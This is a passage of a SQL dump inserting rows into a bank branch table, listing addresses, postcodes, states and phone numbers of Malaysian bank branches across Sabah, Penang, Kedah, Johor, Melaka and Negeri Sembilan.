(287, 10, 3, 'Lot L1L22, Arrival Landside, Terminal 1, Kota Kinabalu International Airport, ', 'Kota Kinabalu, ', '88740 ', 'Sabah ', '+6088-41 3301', NULL, NULL, NULL, NULL),
(288, 10, 3, 'Lot 15, 16 & 17 DBKK, No B-6, B-7 & B-8 Blok B, Lorong Plaza Permai 1, Alamesra, Sulaman Coastal Highway, ', 'Kota Kinabalu, ', '88400 ', 'Sabah ', '+6088-44 8370', NULL, NULL, NULL, NULL),
(289, 10, 3, 'Lots 4 - 6, Block B, SEDCO New Shophouses, Pekan Tomborungus, ', ' Kudat,', '89050', ' Sabah ', '+6088-61 1145', NULL, NULL, NULL, NULL),
(290, 10, 3, 'Lots 28 & 29, Bangunan Kedai Sapang, Jalan Kunak, ', ' Kunak, ', '91207', 'Sabah', '+6089-85 1801', NULL, NULL, NULL, NULL),
(291, 10, 3, 'Lot No. 4 (A&B), Block C, Pusat Komersial Felda Cenderawasih, Felda Sahabat, ', 'Lahad Datu, ', '91100 ', 'Sabah ', '+6089-81 1997', NULL, NULL, NULL, NULL),
(292, 10, 3, 'MDL No: 1280-2, Block 24, Jalan Lily, ', 'Lahad Datu, ', '91100 ', 'Sabah ', '+6089-88 2932', NULL, NULL, NULL, NULL),
(293, 10, 3, 'Lot 92 & 93, Bandar Pasaraya, 4th Mile North Road, ', ' Sandakan,', '90000', ' Sabah ', '+6089-22 3500', NULL, NULL, NULL, NULL),
(294, 10, 3, 'Lot 28, 29 & 30 Block HS-3, Sandakan Harbour Square, ', 'Sandakan, ', '90000 ', 'Sabah ', '+6089-21 3171', NULL, NULL, NULL, NULL),
(295, 10, 3, 'Block 1, Lot No. 7,', 'Semporna, ', ' 91300 ', 'Sabah', '+6089-78 1547', NULL, NULL, NULL, NULL),
(296, 10, 3, ' Lot 25 & 26, Block B, Sipitang Shopping Centre, Jalan Haji Ah Tengah,', 'Sipitang, ', ' 89850 ', 'Sabah', '+6087-82 1757', NULL, NULL, NULL, NULL),
(297, 10, 3, '262-264, Fajar Complex, Jalan Mahkamah, ', 'Tawau,', '91000', 'Sabah ', '+6089-76 3943', NULL, NULL, NULL, NULL),
(298, 10, 3, '48 & 50, Lintang Angsana, Bandar Baru Ayer Itam, ', 'Ayer Itam, ', '11500 ', 'Pulau Pinang', '+604-829 1630', NULL, NULL, NULL, NULL),
(299, 10, 3, '2, Jalan Quah Sin Kheng, ', 'Balik Pulau, ', '11000 ', 'Pulau Pinang', '+604-866 8255', NULL, NULL, NULL, NULL),
(300, 10, 3, '38, Jalan Tengah, Taman Sri Tunas, ', 'Bayan Baru, ', '11950 ', 'Pulau Pinang ', '+604-641 3684', NULL, NULL, NULL, NULL),
(301, 10, 3, '1-1-25, 1-2-26, 1-1-28 & 1-2-28, i-Avenue, Medan Kampung Relau 1, ', 'Bayan Lepas,', '11900 ', ' Pulau Pinang ', '+604-641 0062', NULL, NULL, NULL, NULL),
(302, 10, 3, '1F-27 (1F-02), First Floor, Queensbay Mall, 100 Persiaran Bayan Indah, ', 'Bayan Lepas, ', '11900 ', 'Pulau Pinang ', '+604-642 9766', NULL, NULL, NULL, NULL),
(303, 10, 3, 'No. 9 & 9A, Jalan Relau, ', 'Bayan Lepas, ', '11900 ', 'Pulau Pinang ', '+604-644 5317', NULL, NULL, NULL, NULL),
(304, 10, 3, '2873 & 2874, Pusat Perniagaan Rozhan, Jalan Rozhan, Alma, ', 'Bukit Mertajam,', '14000 ', ' Pulau Pinang', '+604-551 3868', NULL, NULL, NULL, NULL),
(305, 10, 3, '15-6, Danby St., ', ' Bukit Mertajam, ', '14000', 'Pulau Pinang ', '+604-538 4720', NULL, NULL, NULL, NULL),
(306, 10, 3, '447, 448 & 449, Jalan Permatang Rawa, Bandar Perda, ', 'Bukit Mertajam,', '14000 ', ' Pulau Pinang', '+604-538 0002', NULL, NULL, NULL, NULL),
(307, 10, 3, '4177 & 4178, Jln Padang Lalang, Tmn Desa Damai, ', 'Bukit Mertajam, ', '14000 ', 'Pulau Pinang', '+604-530 3620', NULL, NULL, NULL, NULL),
(308, 10, 3, '4277, Bagan Luar Road, ', 'Butterworth, ', '12000 ', 'Pulau Pinang', '+604-332 3406', NULL, NULL, NULL, NULL),
(309, 10, 3, '4776 & 4777, Jln Bagan Luar, ', 'Butterworth, ', '12000 ', 'Pulau Pinang ', '+604-332 4461', NULL, NULL, NULL, NULL),
(310, 10, 3, '6993, Jalan Ong Yi How, ', 'Butterworth, ', '13450 ', 'Pulau Pinang ', '+604-323 6049', NULL, NULL, NULL, NULL),
(311, 10, 3, '21 & 23, Lorong Murni 6, Taman Desa Murni, Sungai Dua, ', 'Butterworth, ', '13800 ', 'Pulau Pinang ', '+604-356 9203', NULL, NULL, NULL, NULL),
(312, 10, 3, '345-H, Bangunan Kelab Gelugor, Jalan Sultan Azlan, ', ' Gelugor, ', '11700', 'Pulau Pinang ', '+604-657 5729', NULL, NULL, NULL, NULL),
(313, 10, 3, 'Lots 77-G-13, 14, 15 & 16, Penang Times Square, Jalan Dato'' Kramat, ', 'Georgetown, ', '10150 ', 'Pulau Pinang ', '+604-226 2627', NULL, NULL, NULL, NULL),
(314, 10, 3, '10-D, Jalan Masjid Negeri, ', 'Georgetown, ', '11600 ', 'Pulau Pinang', '+604-826 1027', NULL, NULL, NULL, NULL),
(315, 10, 3, '552 - 556, Jalan Jelutong, ', 'Georgetown, ', '11600 ', 'Pulau Pinang ', '+604-657 3400', NULL, NULL, NULL, NULL),
(316, 10, 3, '38-C, D & E, Jalan Air Itam, ', 'Georgetown, ', '11500 ', 'Pulau Pinang ', '+604-828 4728', NULL, NULL, NULL, NULL),
(317, 10, 3, 'Lot 101, Basement Level, Terminal Building, Penang International Airport, ', ' Georgetown,', '11900', ' Pulau Pinang ', '+604-645 5761', NULL, NULL, NULL, NULL),
(318, 10, 3, '9, Lebuh Union, ', ' Georgetown, ', '10200', 'Pulau Pinang', '+604-261 1266', NULL, 'MBBEMYKLPGC', NULL, NULL),
(319, 10, 3, '1, Arked Ria Satu, KOMTAR, ', 'Georgetown,', '10000 ', ' Pulau Pinang ', '+604-262 0722', NULL, NULL, NULL, NULL),
(320, 10, 3, 'Ground Floor, Plaza MWE, 8, Lebuh Farquhar, ', 'Georgetown,', '10200 ', ' Pulau Pinang ', '+604-263 7319', NULL, NULL, NULL, NULL),
(321, 10, 3, 'Ground Floor, Canton Square, 56, Cantomnent Road, ', 'Georgetown, ', '10250 ', 'Pulau Pinang ', '+604-226 2270', NULL, NULL, NULL, NULL),
(322, 10, 3, 'No. 222, Ground Floor, Jalan Jelutong, ', ' Georgetown, ', '11600', 'Pulau Pinang ', '+604-282 2564', NULL, NULL, NULL, NULL),
(323, 10, 3, '3615 - 6, Jalan Che Ahmad, Bandar Nibong Tebal, ', 'Nibong Tebal,', '14300 ', ' Pulau Pinang ', '+604-593 9482', NULL, NULL, NULL, NULL),
(324, 10, 3, '1797-G-1, Kompleks Auto World, Jalan Perusahaan, Juru Interchange, ', 'Prai,', '13600 ', ' Pulau Pinang ', '+604-507 5101', NULL, NULL, NULL, NULL),
(325, 10, 3, ' No. 2741, 2742 & 2743, Jalan Chain Ferry, Taman Inderawasih, ', 'Prai, ', '13600 ', 'Pulau Pinang ', '+604-399 2967', NULL, NULL, NULL, NULL),
(326, 10, 3, 'No. 5, Jalan Todak 2, Bdr Baru Seberang Jaya, ', 'Seberang Jaya, ', '13700 ', 'Pulau Pinang ', '+604-397 1950', NULL, NULL, NULL, NULL),
(327, 10, 3, '1, Lorong Bertam Indah 4/9, Taman Bertam Indah, Kepala Batas, ', ' Seberang Perai, ', '13200', 'Pulau Pinang', '+604-579 2825', NULL, NULL, NULL, NULL),
(328, 10, 3, '1637 & 1638, Jalan Bukit Tambun, Simpang Ampat, ', 'Seberang Perai Selatan, ', '14100 ', 'Pulau Pinang', '+604-588 3582', NULL, NULL, NULL, NULL),
(329, 10, 3, '3028 & 3029, Taman Gelugor Indah, Jalan Hasyim Awang, Tasek Gelugor, ', ' Seberang Perai Utara, ', '13000', 'Pulau Pinang ', '+604-573 4408', NULL, NULL, NULL, NULL),
(330, 10, 3, '2C - 2G, Azuria Business Centre, Jalan Lembah Permai, ', 'Tanjung Bungah, ', '11200 ', 'Pulau Pinang ', '+604-899 1277', NULL, NULL, NULL, NULL),
(331, 10, 3, 'Lot P.T. 192, Pusat Perkedaian Baru, ', 'Rantau Panjang, ', '17200 ', 'Kelantan ', '+609-795 0373', NULL, NULL, NULL, NULL),
(332, 10, 3, 'G-Floor, UMNO Building, ', 'Tanah Merah, ', '17500 ', 'Kelantan ', '+609-955 6190', NULL, NULL, NULL, NULL),
(333, 10, 3, 'Lots 103 & 104, Jalan Hulu Besar Pasar, ', 'Tumpat,', '16200', ' Kelantan', '+609-725 7480', NULL, NULL, NULL, NULL),
(334, 10, 3, '1535, Jalan Sultan Badlishah, ', 'Alor Setar, ', '05000 ', 'Kedah ', '+604-731 3855', NULL, NULL, NULL, NULL),
(335, 10, 3, '105A & B, Seberang Jalan Putra,', 'Alor Setar, ', ' 05150 ', 'Kedah ', '+604-732 8027', NULL, NULL, NULL, NULL),
(336, 10, 3, '48 & 49, Ground Floor, Pekan Simpang Kuala, Lebuhraya Sultan Abdul Halim,', 'Alor Setar,  ', ' 05400 ', ' Kedah Tel: ', '+604-771 0832', NULL, NULL, NULL, NULL),
(337, 10, 3, '63-D, Jalan Badlishah, ', ' Baling, ', '09100', 'Kedah ', '+604-470 1676', NULL, NULL, NULL, NULL),
(338, 10, 3, '4 & 5 Jalan Jerai 1, Taman Jerai Maju,', 'Gurun,', ' 08300 ', ' Kedah ', '+604-461 9903', NULL, NULL, NULL, NULL),
(339, 10, 3, '24G & H, Lot 629, Main Road, ', ' Kodiang, ', '06100', 'Kedah', '+604-925 0055', NULL, NULL, NULL, NULL),
(340, 10, 3, 'Suite B-2, Ground Floor, KHTP Business Centre, Kulim Hi-Tech Park, ', 'Kulim,', '09000 ', ' Kedah ', '+604-403 3986', NULL, NULL, NULL, NULL),
(341, 10, 3, '254, Jalan Tuanku Putra, ', 'Kulim,', '09000 ', ' Kedah ', '+604-490 6494', NULL, NULL, NULL, NULL),
(342, 10, 3, 'Lot 101-103, Jalan Lagenda 1, Lagenda Heights, ', 'Sungai Petani, ', '08000 ', 'Kedah ', '+604-425 0710', NULL, NULL, NULL, NULL),
(343, 10, 3, '5-11, Jalan Pandak Mayah 1, Pusat Bandar Kuah, ', ' Langkawi, ', '07000', 'Kedah ', '+604-966 6208', NULL, NULL, NULL, NULL),
(344, 10, 3, 'Lot G-02, Petronas Quay, Telaga Harbour Park, Pantai Kok, ', ' Pulau Langkawi,', '07000', ' Kedah ', '+604-959 1085', NULL, NULL, NULL, NULL),
(345, 10, 3, 'G27, Ground Floor, Central Square Complex, 23, Jln Kampung Baru, ', ' Sungai Petani, ', '08000', 'Kedah', '+604-421 6877', NULL, NULL, NULL, NULL),
(346, 10, 3, '138 & 139, Jalan Kelab Cinta Sayang, Taman Ria Jaya, ', 'Sungai Petani, ', '08000 ', 'Kedah ', '+604-441 3358', NULL, NULL, NULL, NULL),
(347, 10, 3, '32 - 4, Jalan Rahmat, ', 'Batu Pahat,', '83000 ', ' Johor', '+607-434 1441', NULL, NULL, NULL, NULL),
(348, 10, 3, 'No. 31 & 32, Jalan Mengkudu, Taman Abdul Rahman Jaafar, ', 'Batu Pahat,', '83000 ', ' Johor', '+607-433 4845', NULL, NULL, NULL, NULL),
(349, 10, 3, '84, Jalan Rahmat,', 'Batu Pahat, ', ' 83000 ', 'Johor', '+607-431 6844', NULL, NULL, NULL, NULL),
(350, 10, 3, '175 & 176, Jalan PJ 7, Pekan Jitra 2, ', 'Jitra, ', '06000 ', 'Johor ', '+604-916 2248', NULL, NULL, NULL, NULL),
(351, 10, 3, '18 & 20, Jalan Sagu 8, Taman Daya, ', 'Johor Bahru, ', '81100 ', 'Johor ', '+607-356 2805', NULL, NULL, NULL, NULL),
(352, 10, 3, '85 - 87, Jalan Dedap 6, Taman Johor Jaya, ', 'Johor Bahru, ', '81100 ', 'Johor ', '+607-355 3663', NULL, NULL, NULL, NULL),
(353, 10, 3, '47 & 49, Jalan Molek 3/1, Taman Molek, ', 'Johor Bahru, ', '81100 ', 'Johor ', '+607-351 4568', NULL, NULL, NULL, NULL),
(354, 10, 3, '10 & 12, Jalan Pingai, Taman Pelangi, ', 'Johor Bahru, ', '80400 ', 'Johor ', '+607-334 7351', NULL, NULL, NULL, NULL);
INSERT INTO `banks_branch_info` (`bbi_id`, `ba_id`, `co_id`, `bbi_address`, `bbi_city`, `bbi_zipcode`, `bbi_state`, `bbi_phone`, `bbi_digitrouting`, `bbi_swiftcode`, `bbi_addinfo`, `bbi_status`) VALUES
(355, 10, 3, 'No. 17 & 19, Jalan Persisiran Perling, Taman Perling, ', ' Johor Bahru, ', '81200', 'Johor ', '+607-238 5273', NULL, NULL, NULL, NULL),
(356, 10, 3, '59, Jalan Sri Bahagia Lima, Taman Seri Bahagia, Tampoi,', ' Johor Bahru,', ' 81250', ' Johor ', '+607-237 3645', NULL, NULL, NULL, NULL),
(357, 10, 3, 'Lot G02, AEON Bukit Indah Shopping Centre, No 8, Jalan Indah 15/2, Taman Bukit Indah, ', 'Johor Bahru, ', '81200 ', 'Johor ', '+607-236 7045', NULL, NULL, NULL, NULL),
(358, 10, 5, 'No. 8, Jalan Setia Tropika 1/21, Taman Setia Tropika, ', 'Johor Bahru, ', '81000 ', 'Johor', '+607-232 0748', NULL, NULL, NULL, NULL),
(359, 10, 3, '113-5, Jalan Glasiar, Taman Tasek, ', 'Johor Bahru, ', '80200 ', 'Johor ', '+607-236 1500', NULL, NULL, NULL, NULL),
(360, 10, 3, '49-A, Jalan Segget, ', ' Johor Bahru, ', '80000', 'Johor ', '+607-224 4930', NULL, NULL, NULL, NULL),
(361, 10, 3, '69 - 75, Jalan Meranti Merah, Kebun Teh, ', 'Johor Bahru, ', '80250 ', 'Johor ', '+607-333 2989', NULL, NULL, NULL, NULL),
(362, 10, 3, 'Lot 1-22, Level 1, 2 & 3, Johor Bahru City Centre, 106-108, Jalan Wong Ah Fook, ', 'Johor Bahru, ', '80000 ', 'Johor ', '+607-228 2400', NULL, NULL, NULL, NULL),
(363, 10, 3, 'No. 5 & 7, Jalan Susur Dewata Satu, Larkin Perdana,', 'Johor Bahru,', ' 80350 ', ' Johor ', '+607-235 3155', NULL, NULL, NULL, NULL),
(364, 10, 3, '37, Jalan Intan 2/1, Taman Intan, ', 'Kluang,', '86000 ', ' Johor ', '+607-774 5401', NULL, NULL, NULL, NULL),
(365, 10, 3, '30 - 34, Jalan Dato Haji Hassan, ', 'Kluang, ', '86000 ', 'Johor ', '+607-772 4718', NULL, NULL, NULL, NULL),
(366, 10, 3, 'Lot 5, Siar Jauhar, Dewan Negeri Johor,', 'Kota Iskandar, ', ' 79100 ', 'Johor', '+607-556 0312', NULL, NULL, NULL, NULL),
(367, 10, 3, 'Kedai FELDA, Rancangan FELDA Air Tawar 5, ', 'Kota Tinggi, ', '81920 ', 'Johor ', '+607-895 3641', NULL, NULL, NULL, NULL),
(368, 10, 3, '18 & 19, Jalan Niaga Satu, Pusat Perdagangan,', 'Kota Tinggi, ', ' 81900 ', 'Johor ', '+607-883 5088', NULL, NULL, NULL, NULL),
(369, 10, 3, '1B, Jalan Tun Abdul Jalil, Pusat Bandar, Bandar Tenggara,', 'Kulai, ', ' 81000 ', 'Johor ', '+607-896 1324', NULL, NULL, NULL, NULL),
(370, 10, 3, '21 & 22, Jalan Susur Satu, Batu 26, Jalan Air Hitam, Kelapa Sawit,', ' Kulai, ', ' 81030', 'Johor', '+607-652 5384', NULL, NULL, NULL, NULL),
(371, 10, 3, '146 - 7, Jalan Raya, ', 'Kulai, ', '81000 ', 'Johor', '+607-663 1252', NULL, NULL, NULL, NULL),
(372, 10, 3, '1 & 3, Jalan Sutera 1, Taman Mewa, ', 'Layang-Layang, ', '81850 ', 'Johor ', '+607-752 6485', NULL, NULL, NULL, NULL),
(373, 10, 3, '7/1, 7/2 & 7/3, Jalan Yong Peng, ', 'Labis, ', '85300 ', 'Johor ', '+607-925 2022', NULL, NULL, NULL, NULL),
(374, 10, 3, 'G-01, 01-01 & 02-01, Block A, Permas Mall, No 3, Jalan Permas Utara, Bandar Baru Permas Jaya, ', 'Masai, ', '81750 ', 'Johor', '+607-388 1208', NULL, NULL, NULL, NULL),
(375, 10, 3, 'No. 17, Jalan Suria 3, Bandar Seri Alam, ', 'Masai, ', '81750 ', 'Johor', '+607-251 1966', NULL, NULL, NULL, NULL),
(376, 10, 3, '22 - 4, Jalan Ismail, ', 'Mersing, ', '86800 ', 'Johor', '+607-799 1242', NULL, NULL, NULL, NULL),
(377, 10, 3, 'No. 57-1 & 57-2, Jalan Sulaiman, ', 'Muar, ', '84000 ', 'Johor ', '+606-952 3221', NULL, NULL, NULL, NULL),
(378, 10, 3, '104, Jalan Abdullah,', 'Muar, ', ' 80400 ', 'Johor ', '+606-952 1544', NULL, NULL, NULL, NULL),
(379, 10, 3, 'No. 14-3 & 14-4, Pagoh Main Road, Pekan Pagoh,', 'Muar, ', ' 84600 ', 'Johor ', '+606-974 6051', NULL, NULL, NULL, NULL),
(380, 10, 3, '2, Jalan Temenggong,', 'Paloh,', ' 86600 ', ' Johor ', '+607-781 2767', NULL, NULL, NULL, NULL),
(381, 10, 3, '170, Jalan Omar, ', 'Parit Jawa, ', '84150 ', 'Johor', '+606-987 4411', NULL, NULL, NULL, NULL),
(382, 10, 3, 'No. 1 & 3, Jalan Cempaka 1, Taman Bunga Cempaka Biru, ', 'Parit Raja, ', '86400 ', 'Johor ', '+607-454 4300', NULL, NULL, NULL, NULL),
(383, 10, 3, '14, Pusat Perdagangan, Jalan Bandar,', 'Pasir Gudang, ', ' 81700 ', 'Johor ', '+607-251 4696', NULL, NULL, NULL, NULL),
(384, 10, 3, '3-4, Jalan Johor, ', ' Pekan Nenas, ', '81500', 'Johor', '+607-699 1048', NULL, NULL, NULL, NULL),
(385, 10, 3, '7, Jalan Pasar, Sungai Rengit,', 'Pengerang, ', ' 81620 ', 'Johor ', '+607-826 3466', NULL, NULL, NULL, NULL),
(386, 10, 3, 'No 7, 8, 9 & 10, Jalan Delima 5, Pusat Perdagangan Pontian, ', 'Pontian, ', '82000 ', 'Johor ', '+607-687 1271', NULL, NULL, NULL, NULL),
(387, 10, 3, 'Lot 10, Jalan Muhibbah, ', ' Rengit, ', '83100', 'Johor', '+607-424 1322', NULL, NULL, NULL, NULL),
(388, 10, 3, 'UMNO Building, Jalan Awang, ', ' Segamat, ', '85000', 'Johor', '+607-931 7782', NULL, NULL, NULL, NULL),
(389, 10, 3, 'No. 62J & 62K, Jalan Genuang, ', 'Segamat,', '85000 ', ' Johor ', '+607-932 0081', NULL, NULL, NULL, NULL),
(390, 10, 3, 'No. 136 & 137, Jalan Senai Utama 5/17, ', 'Senai, ', '81400 ', 'Johor', '+607-598 6233', NULL, NULL, NULL, NULL),
(391, 10, 3, '1 & 2, Jalan Kijang, Taman Mohd Yassin,', 'Simpang Renggam, ', ' 86200 ', 'Johor ', '+607-755 8530', NULL, NULL, NULL, NULL),
(392, 10, 3, '18-20, Jalan Perwira 17, Taman Ungku Tun Aminah,', 'Skudai, ', ' 81300 ', 'Johor', '+607-556 3944', NULL, NULL, NULL, NULL),
(393, 10, 3, '15, Jalan Bestari 1/5, Taman Nusa Bestari, ', 'Skudai, ', '81300 ', 'Johor ', '+607-512 7645', NULL, NULL, NULL, NULL),
(394, 10, 3, '1, Kebudayaan 4, Taman Universiti, ', 'Skudai, ', '81300 ', 'Johor', '+607-521 4561', NULL, NULL, NULL, NULL),
(395, 10, 3, '10 - 11, Jalan Muar, ', 'Tangkak, ', '84900 ', 'Johor ', '+606-978 1269', NULL, NULL, NULL, NULL),
(396, 10, 3, '4-5, Jalan Raya, Taman Tiram Baru, ', ' Ulu Tiram, ', '81800', 'Johor', '+607-861 2662', NULL, NULL, NULL, NULL),
(397, 10, 3, '216 & 218, Jalan Besar, Taman Sembrong Baru, ', 'Yong Pen, ', '83700 ', 'Johor ', '+607-467 5809', NULL, NULL, NULL, NULL),
(398, 11, 3, 'Graha UMNO Jalan Hang Tuah ', ' Melaka ', '75300', ' Melaka', '606 - 284 0455', NULL, NULL, NULL, NULL),
(399, 11, 3, '188 Taman Melaka Raya Off Jalan Parameswara ', ' Melaka ', '75000', ' Melaka', ' 606 - 284 8960', NULL, NULL, NULL, NULL),
(400, 11, 3, '110 Jalan Bendahara', 'Melaka', ' 75100 ', 'Melaka ', '606 - 283 4813', NULL, NULL, NULL, NULL),
(401, 11, 3, 'No 31 Kompleks Perniagaan Al-Azim Bukit Palah ', ' Melaka', '75150', ' Melaka', '606 - 283 8844', NULL, NULL, NULL, NULL),
(402, 10, 3, 'No 2-C  Jalan Cheng Perdana 1/1B Taman Cheng Perdana ', 'Melaka', '75250 ', 'Melaka', '606 - 312 5344', NULL, NULL, NULL, NULL),
(403, 11, 3, '30 Jalan Mutiara Melaka 2 Taman Mutiara Melaka ', 'Melaka', '75350 ', 'Melaka', ' 606 - 317 6397', NULL, NULL, NULL, NULL),
(404, 11, 3, '3733 Jalan Kesang ', 'Jasin', '77000 ', 'Melaka', ' 606 - 529 8881', NULL, NULL, NULL, NULL),
(405, 11, 3, 'AG 9495 Jalan Simpang 4 ', 'Alor Gajah ', '78000 ', 'Melaka', '606 - 556 2935', NULL, NULL, NULL, NULL),
(406, 11, 3, '36 & 37 Lorong Setia 1 Air Keroh Heights ', ' Melaka', '75450', ' Melaka', '606 - 232 2189', NULL, NULL, NULL, NULL),
(407, 11, 3, 'Ground Floor Unit No. 38 Jalan Kenanga 29/3  Genting Indrapura', 'Kulai Jaya ', ' 81000 ', 'Johor ', '07 - 663 1488', NULL, NULL, NULL, NULL),
(408, 11, 3, '18 Jalan Belimbing ', ' Senai ', '81400', 'Johor  ', '07 - 599 2155', NULL, NULL, NULL, NULL),
(409, 11, 3, '25 Jalan Medan Nusa Perintis 6 Taman Nusa Perintis 2 ', ' Gelang Patah ', '81550', 'Johor ', ' 07 - 530 0000', NULL, NULL, NULL, NULL),
(410, 11, 3, '30 Jalan Niaga 1 Pusat Dagangan  Jalan Mawai ', 'Kota Tinggi ', '81900 ', 'Johor ', '07 - 883 7507', NULL, NULL, NULL, NULL),
(411, 11, 3, 'No 55 Ground Floor  Jalan Rambutan ', 'Kluang', '86000 ', ' Johor', ' 07 - 772 5921', NULL, NULL, NULL, NULL),
(412, 11, 3, 'No 101 - 102  Jalan Gambir 8 Bandar Baru Bukit Gambir ', 'Muar ', '84800 ', 'Johor  ', ' 06 - 976 2489', NULL, NULL, NULL, NULL),
(413, 11, 3, '39A Jalan Rahmat ', 'Batu Pahat ', '83000 ', 'Johor ', ' 07 - 431 8248', NULL, NULL, NULL, NULL),
(414, 11, 3, '75 Jalan Kuning Dua Taman Pelangi ', ' Johor Bharu ', '80400', 'Johor ', '07 - 331 2090', NULL, NULL, NULL, NULL),
(415, 11, 3, 'No. 5 Jalan Kebun Teh 1 Pusat Perdagangan Kebun Teh ', 'Johor Bharu ', '80250 ', 'Johor  ', '07 - 226 9100', NULL, NULL, NULL, NULL),
(416, 11, 3, 'Bangunan UMNO 51 Jalan Segget ', ' Johor Bahru ', '80000', 'Johor ', '07 - 222 4833', NULL, NULL, NULL, NULL),
(417, 11, 3, '39 Jalan Permas 10/2 Bandar Baru Permas Jaya ', 'Masai ', '81750 ', 'Johor', ' 07 - 386 2519', NULL, NULL, NULL, NULL),
(418, 11, 3, 'No. 8 Jalan Dedap Taman Johor Jaya ', ' Johor Bharu ', '81100', 'Johor ', '07 - 354 4501', NULL, NULL, NULL, NULL),
(419, 11, 3, '81 Taman Orkid Baru ', ' Labis ', '85300', 'Johor', ' 07 - 925 3836', NULL, NULL, NULL, NULL),
(420, 11, 3, '4 Jalan Ismail ', ' Mersing ', '86800', 'Johor  ', '07 - 799 1600', NULL, NULL, NULL, NULL),
(421, 11, 3, '57-3 & 57-4 Jalan Sulaiman ', 'Muar ', '84000 ', 'Johor ', '06 - 953 5399', NULL, NULL, NULL, NULL),
(422, 11, 3, 'No 165 & 167 Jalan NB2 2/2 ', 'Skudai ', '81300 ', 'Johor ', ' 07 - 512 1788', NULL, NULL, NULL, NULL),
(423, 11, 3, 'Ground Floor Lot 11601 & 11602  Jalan Kluang Parit Raja ', 'Batu Pahat ', '86400 ', 'Johor ', ' 07 - 454 1311', NULL, NULL, NULL, NULL),
(424, 11, 3, '76 Jalan Muar Parit Sulong ', ' Batu Pahat', '83500', ' Johor ', '  07 - 418 6258', NULL, NULL, NULL, NULL),
(425, 11, 3, '382 Jalan Simbang Taman Perling', 'Johor Bharu ', ' 81200 ', 'Johor', '07 - 238 9770', NULL, NULL, NULL, NULL),
(426, 11, 3, 'Lot L2.34 Level 2 Kompleks Plaza Angsana Pusat Bandar Tampoi  ', 'Johor Bharu ', '81200 ', 'Johor  ', '07 - 236 8591', NULL, NULL, NULL, NULL),
(427, 11, 3, '742 Wisma Koperasi Jalan Taib ', 'Pontian Kechil ', '82000 ', 'Johor  ', '07 - 687 1533', NULL, NULL, NULL, NULL),
(428, 11, 3, '13A Pusat Perdagangan Jalan Bandar ', ' Pasir Gudang ', '81700', 'Johor', '07 - 252 4955', NULL, NULL, NULL, NULL),
(429, 11, 3, '113 Jalan Genuang ', 'Segamat ', ' 85000 ', 'Johor', '07 - 931 3653', NULL, NULL, NULL, NULL),
(430, 11, 3, '2 & 4 Jalan Sagu 1 Taman Daya ', 'Johor Bahru', '81100 ', ' Johor', '07 - 351 1940', NULL, NULL, NULL, NULL),
(431, 11, 3, 'No 93A  Jalan Seri Impian 1 Taman Impian Emas Skudai ', ' Johor Bharu', '81300', 'Johor', ' 07 - 558 4549', NULL, NULL, NULL, NULL),
(432, 11, 3, '30 Jalan Serampang Taman Pelangi ', 'Johor Bahru ', '80050 ', 'Johor ', '  07 - 332 4930', NULL, NULL, NULL, NULL),
(433, 11, 3, '87 Jalan Pahlawan 1 Taman Ungku Tun Aminah ', 'Skudai ', '81300 ', 'Johor  ', '  07 - 556 7700', NULL, NULL, NULL, NULL),
(434, 11, 3, ' 21 Jalan Kebudayaan 4 Taman Universiti ', ' Skudai ', '81300', 'Johor   ', ' 07 - 521 5055', NULL, NULL, NULL, NULL),
(435, 11, 3, '193B Batu 4 1/2 Jalan Skudai ', 'Tampoi', '80200 ', ' Johor', '07 - 236 3733', NULL, NULL, NULL, NULL),
(436, 11, 3, 'Bangunan Hal Ehwal Pelajar Universiti Teknologi Malaysia ', 'Skudai ', '81300 ', 'Johor ', '07 - 557 7103', NULL, NULL, NULL, NULL),
(437, 11, 3, '21 & 22 Tingkat Bawah Jalan Mahligai ', 'Bahau ', '72100 ', 'Negeri Sembilan', '606 - 454 5819', NULL, NULL, NULL, NULL),
(438, 11, 3, '4232 Jalan Besar ', ' Bukit Pelanduk ', '71960', 'Negeri Sembilan', ' 606 - 667 3688', NULL, NULL, NULL, NULL),
(439, 11, 3, '1 Jalan Angkasa Jaya Bukit Pilah Perdana ', ' Kuala Pilah ', '72000', 'Negeri Sembilan', '606 - 481 1308', NULL, NULL, NULL, NULL),
(440, 11, 3, ' 1A Bangunan Dewan Perniagaan Melayu Negeri Sembilan Jalan Dato'' Bandar Tunggal ', 'Seremban ', '70000 ', 'Negeri Sembilan', '606 - 762 5305', NULL, NULL, NULL, NULL),
(441, 11, 3, 'Bangunan RISDA 13 & 14 Jalan Terentang ', 'Rembau ', '71300 ', 'Negeri Sembilan ', ' 606 - 685 1204', NULL, NULL, NULL, NULL),
(442, 11, 3, 'No 9 & 10 PD Centre Point Jalan Mahajaya ', 'Port Dickson ', '71000 ', 'Negeri Sembilan', '606-647 1772', NULL, NULL, NULL, NULL),
(443, 11, 3, 'Lot 3110 Jalan Besar Lukut ', 'Port Dickson ', '71010 ', 'Negeri Sembilan ', ' 606 - 651 1946', NULL, NULL, NULL, NULL),
(444, 11, 3, '9G Arab Malaysian Business Centre Jalan Tuanku Munawir ', ' Seremban ', '70000', 'Negeri Sembilan ', ' 606 - 761 7519', NULL, NULL, NULL, NULL),
(445, 11, 3, '51 Lorong Sri Mawar 12/2 Taman Sri Mawar', 'Senawang ', ' 70450 ', 'Negeri Sembilan ', '606 - 679 2739', NULL, NULL, NULL, NULL),
(446, 11, 3, 'No 11-G & 12-G & 12-1 Jalan S2B15 Biz Avenue Seremban 2 ', 'Seremban', '70300 ', ' Negeri Sembilan', '606 - 601 6253', NULL, NULL, NULL, NULL),
(447, 11, 3, '5717 Jalan TS 2/1D Taman Semarak ', 'Nilai ', '71800 ', 'Negeri Sembilan  ', '606 - 799 4864', NULL, NULL, NULL, NULL),
(448, 11, 3, 'Bangunan Baru UMNO Jalan Besar ', ' Tampin ', '73000', 'Negeri Sembilan  ', '606 - 441 1588', NULL, NULL, NULL, NULL),
(449, 11, 3, '68 Wisma Gerakan Jalan Besar', 'Titi ', ' 71650 ', 'Negeri Sembilan ', ' 606 - 611 3166', NULL, NULL, NULL, NULL),
(450, 11, 3, 'G-811 Ground Floor 1 Borneo Hypermarket Sulaman ', ' Kota Kinabalu ', '88450', 'Sabah', ' 6088 - 485 290', NULL, NULL, NULL, NULL),
(451, 11, 3, 'Api-Api Centre Lot 4/G3 ', 'Kota Kinabalu ', '88000 ', 'Sabah', '6088 - 264 287', NULL, NULL, NULL, NULL),
(452, 11, 3, 'Block A3 Lot 11 Bandar Utama Sandakan  Jalan Utara 6th Mile', 'Sandakan ', ' 90000 ', 'Sabah', ' 6089 - 215 540', NULL, NULL, NULL, NULL),
